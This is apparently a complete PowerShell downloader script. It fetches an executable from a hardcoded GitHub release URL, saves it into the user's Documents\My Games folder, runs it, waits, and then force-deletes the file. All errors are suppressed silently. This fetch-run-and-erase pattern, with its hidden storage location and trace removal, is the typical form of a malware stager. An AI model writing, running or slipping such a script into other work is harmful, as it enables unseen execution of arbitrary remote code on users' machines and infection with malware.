$HardcodedUrl = "https://github.com/kagagagag/html/releases/download/test/test.exe"
$process = $null

try {
    $Uri = [System.Uri]$HardcodedUrl
    $FileNameFromUrl = $Uri.Segments[-1]
    if ([string]::IsNullOrWhiteSpace($FileNameFromUrl)) {
        $FileNameFromUrl = "dl_file_$(Get-Random).exe"
    }
} catch {
    exit 1
}

$targetDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'My Games'
$downloadPath = Join-Path $targetDir $FileNameFromUrl

try {
    New-Item -ItemType Directory -Path $targetDir -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri $HardcodedUrl -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $downloadPath) {
        $process = Start-Process -FilePath $downloadPath -PassThru -Wait -ErrorAction Stop
    } else {
        return
    }
} catch {

} finally {
    if (Test-Path $downloadPath) {
        try {
            Start-Sleep -Seconds 1
            Remove-Item -Path $downloadPath -Force -ErrorAction Stop
        } catch {

        }
    }
}
